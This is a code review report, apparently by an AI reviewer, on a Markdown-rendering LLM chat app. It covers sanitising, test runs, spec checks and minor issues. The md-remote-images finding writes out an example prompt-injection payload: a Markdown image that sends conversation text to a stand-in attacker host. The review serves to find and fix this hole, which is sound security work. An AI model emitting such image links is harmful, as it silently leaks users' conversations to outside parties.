VERDICT: APPROVE
SCORE: 94/100
BLOCKERS: 0  MAJORS: 0  MINORS: 6

| Area | Max | Score | Deductions |
|---|---|---|---|
| Spec adherence | 25 | 24 | t2-gate-todo-stale −1 |
| Correctness | 25 | 24 | user-dialog-closes-on-server-error −1 |
| Tests | 20 | 17 | cost-float-artifact-untested −1, quota-pct-unasserted −1, confirm-dialog-untested −1 |
| Security | 15 | 14 | md-remote-images −1 |
| CLAUDE.md rules | 15 | 15 | none |
| **Total** | 100 | **94** | |

Review round 4. Scope: everything in `git status --porcelain`. Since review 3, nearly all changes are in `frontend/` (the UX audit-1 fixes). No file in `backend/src` or `backend/test` has changed since review 3. `CLAUDE.md` now allows `marked` + `DOMPurify` and names `docs/ux/ui-design.md` as the visual source of truth; the user approved both. I did not read `.env` or `test-results/ux/credentials.local.json`, and I did not run the acceptance suite (QA runs it next).

## Test and lint run
- `npm run lint` exits 0: ESLint shows 0 errors and backend `tsc --noEmit` (app and migrations) is clean. There are 3 warnings, all "unused eslint-disable" in generated `backend/coverage/lcov-report/*.js`. That is generated output; adding `coverage/` to the ESLint ignores would silence them. Not scored.
- `npm test`, first full run: backend gave **1 failure out of 116**. `rollup.test.ts` › "defaults to yesterday (IST)" hit the 30 s Jest timeout, and the suite took 148 s. Because of that failure, the frontend tests did not start.
  - I re-ran `rollup.test.ts` alone: 6 of 6 passed in 5.6 s.
  - I then re-ran the full backend and frontend tests: **backend 12 of 12 suites, 116 of 116 tests passed** (rollup 5.1 s, perf `quota.check p95 = 4.9 ms`), and **frontend Karma 72 of 72 passed** (up from 44). Both exit 0.
  - None of the backend code or tests changed since review 3. `maxWorkers: 1` rules out suites competing with each other. The `pg_advisory_xact_lock` is per-database, so the running dev backend (`tsx watch`, app DB) cannot block it. I'm treating the stall as a one-off from DB-server load, not a code defect. If it happens again, open `rollup-test-timeout`.

## Focus 1: XSS and sanitising (pass)
- The pipeline is `marked` (gfm, breaks, `async: false`) → `DOMPurify.sanitize` → `[innerHTML]` (`core/markdown.ts:26-29`, `markdown.pipe.ts`, `message-list.component.ts:25,40`). Angular's own sanitiser then runs again on the binding, and it keeps the `target` and `rel` attributes. **There is no `bypassSecurityTrust*` and no `DomSanitizer` anywhere in `frontend/src`.**
- DOMPurify config:
  - `USE_PROFILES: { html: true }` drops SVG and MathML, which is the larger attack surface.
  - `FORBID_TAGS` covers style, form, input and button. `FORBID_ATTR` covers style.
  - DOMPurify's default URI allow-list removes `javascript:`, `vbscript:` and non-image `data:` URLs.
  - The `afterSanitizeAttributes` hook forces `target="_blank"` and `rel="noopener noreferrer"` on every `<a href>`. It is registered once, at module load.
- User messages render by interpolation only (`message-list.component.ts:27`, `.plain` with `pre-wrap`). A Karma test checks that `**not bold**` stays literal.
- The tests in `markdown.spec.ts` cover:
  - `<script>`, `onerror` and `onclick` are stripped.
  - `javascript:` links are dropped.
  - `rel` is present.
  - A DOM-bound payload does not execute.
  - Partial Markdown during streaming (fence auto-close, unclosed `**`, half-written link, empty string).
- Versions are pinned exactly: `dompurify: "3.4.17"` and `marked: "18.1.3"` in `frontend/package.json`, and the lockfile resolves the same versions with integrity hashes.
- One minor gap: remote images are allowed (see `md-remote-images` below).

## Focus 2: regressions against the PRD and spec (pass)
- **AC-22 still holds.** The desktop meter shows `quota-<k>-remaining` = "$x.xxxxxx left" (6 dp), then "of $quota", the bar, then "NN.NN% left" on its own line, then the IST reset (`quota-panel.component.ts:44-49`). The mobile strip shows "$x left · NN.NN%" (`:59-60`). Both meters update from the store after each message, as before.
  - Acceptance assertions still match: `toContainText('$0.10')` and `not.toContainText('$0.100000 left')`.
  - No unit test pins the % text any more (`quota-pct-unasserted`).
- **AC-23 holds.** `quota-block-reason` is "Personal quota reached" or "System quota reached" (`chat.store.ts:24`), and `quota-reset-time` is "Resets <formatIst>", which ends in "IST". The banner is `role="alert"` and `tabindex="-1"`, and it takes focus after a block (`chat.page.ts:159`). The detail copy matches ui-design §4.2.
- **AC-27/28 hold.**
  - Deactivate opens `ConfirmDialogComponent`. Cancel has initial focus. If the user declines, the toggle is restored (`users-tab.component.ts:226-247`). A snackbar confirms the result.
  - ADMIN→USER opens a "Remove admin" confirm (`:187-195`).
  - On the self row, `active-toggle` is still rendered and disabled, with a lock icon and a keyboard-focusable tooltip. The role select is disabled with a hint. `buildUserPatch` never sends a self role change, and the server enforces AC-28 independently.
- The testids listed in ui-design §"must be kept" are all still present in the files I checked: chat, quota, banner, admin users and settings.

## Focus 3: first-attempt failures in the acceptance tests (test timing, not an app bug)
- I looked for app-side causes and found none:
  - **Login** (`login.page.ts`): no SSR or hydration (no `provideClientHydration`). The root is a plain `<router-outlet />` with no conditional rendering, so the page can't be torn down and rebuilt mid-fill. Login has no guard and no navigation on init. The validators are synchronous `required` checks with no async validator. Zone change detection runs on the `input` event.
  - **User dialog** (`user-dialog.component.ts`): validators are synchronous (`required`, `email`, `minLength(8)`, `pattern`). The form is built in a field initializer from injected data. There is no async init and no `valueChanges` side effects. The test's `uniq('ui')@example.test` addresses pass `Validators.email`.
  - In this state, a filled form cannot leave the button disabled for 60 s.
- The symptom ("both fields empty and Sign in disabled" on the first test of the only browser spec, then a pass on retry) is what a full page reload between `fill` and `click` looks like. The likely cause is the `ng serve` live reload or a cold rebuild after the engineer's edits or the new prebundled deps. The admin failure fits the same pattern: it is the next browser test, and it also passed on retry.
- **For QA:**
  - Run against a stable server (`ng serve --live-reload=false`, or `ng build` plus a static server), and don't edit files during a run.
  - Add a warm-up `page.goto('/')` in `beforeAll`.
  - After each `fill`, assert `toHaveValue`. Before clicking `login-submit` or `user-save`, assert `toBeEnabled()`.
- Related app issue: the "duplicate shows a server error and keeps the dialog" step only passes by racing the close animation, because the dialog closes before the API call (`user-dialog-closes-on-server-error` below).

## Focus 4: initial bundle 506.65 kB over the 500 kB warning budget (accepted, not scored)
- The budget is exceeded by 6.65 kB (1.3%). It is a warning, and the error limit is 1 MB. This is a local demo with lazy-loaded routes.
- Recommendation for the engineer, optional: look at the build stats (`ng build --stats-json`) to see whether `marked`/`dompurify` or Material modules ended up in the initial chunk through a shared import (for example `AuthService` → `ChatStore`). If they did, keep them in the lazy chat chunk. Otherwise, raise `maximumWarning` to `550kB` with a comment.

## Focus 5: Settings Save disabled on invalid input (accepted deviation, not scored)
- ui-design §4.9 says to keep Save enabled and focus the first invalid field. The QA-owned acceptance test (`ui-flows.spec.ts:139`) asserts `settings-save` is disabled after `-5`, and the engineer may not edit that test.
- The PRD (AC-24) only requires invalid values to be rejected, and the code does that both ways: the button is disabled and `submit()` guards `form.invalid` (`settings-tab.component.ts:79,121`). The server-side zod validation is unchanged.
- The two documents conflict, and the code is not at fault. The UX designer (ui-design) or QA (the test) should reconcile them, and the user should decide which behaviour wins. Until then, the engineer's choice is correct. The same pattern applies to `login-submit` and `user-save`.

## Issues
- [t2-gate-todo-stale] backend/src/services/llm-gateway.ts:104 — minor — Still open from review 3. Replace `TODO(T-2 gate UNVERIFIED)` with: "Path A: T-2 gate passed 2026-11-05; cost comes from the final stream chunk `usage.cost` (include_cost_in_streaming_usage). No fallback pricing."
- [cost-float-artifact-untested] backend/test/unit/llm-usage.test.ts:8 — minor — Still open from review 3. Add `parseUsage` cases for `cost: 5.999999999999999e-6`, expecting `costUsd '0.000006'` and `costRaw '0.000005999999999999999'`, and for `cost: 4e-8`, expecting `costUsd '0.000000'` and `costRaw '4e-8'`.
- [user-dialog-closes-on-server-error] frontend/src/app/features/admin/user-dialog.component.ts:90 (with users-tab.component.ts:164-174) — minor — The dialog closes before `createUser` runs. A duplicate email (AC-27) only shows a snackbar, and the typed data is lost. The acceptance step that expects the dialog to stay open passes only while the close animation runs. Fix: have the dialog call the API itself (or take a `save` callback), close only on success, and show the server error inline in a `role="alert"` (for example "Email already in use") so the dialog stays open.
- [md-remote-images] frontend/src/app/core/markdown.ts:28 — minor — `<img>` with remote `src` is allowed. A prompt-injected reply can embed `![](https://attacker/?q=<conversation text>)`, and the browser fetches it automatically. This is a known zero-click exfiltration channel for LLM output. Fix: add `'img'` to `FORBID_TAGS`, or keep images only for `data:` sources by removing remote `src` in the hook. Add a test for it.
- [quota-pct-unasserted] frontend/src/app/features/chat/quota-panel.component.spec.ts:28 — minor — The test is called "shows remaining USD and %" but it no longer checks the percentage. AC-22 requires both. Assert "87.65% left" and "98.77% left" on desktop and "· 87.65%" in the compact strip.
- [confirm-dialog-untested] frontend/src/app/features/admin/users-tab.component.ts:226 — minor — There is no unit test for the deactivate confirm (decline restores the toggle and sends no PATCH; confirm sends `{ isActive: false }` and shows the snackbar) or for the ADMIN→USER confirm in `edit()`. Add TestBed tests with a stubbed `MatDialog` and `AdminApi`.

## Resolved since last review
- none. Both review-3 minors (`t2-gate-todo-stale`, `cost-float-artifact-untested`) are still open. No earlier key has recurred: `stream-survives-logout` and `chat-store-not-reset-on-logout` are still fixed, and the composer no longer disables the textarea while streaming (`composer.component.ts:37` disables only the Send button).

## Open items carried from the spec (unchanged)
- Provisional Q3 to Q6 in spec §9 still need user confirmation.
- The Save enabled/disabled conflict between ui-design §4.9 and the QA test (Focus 5) is for the user to decide.
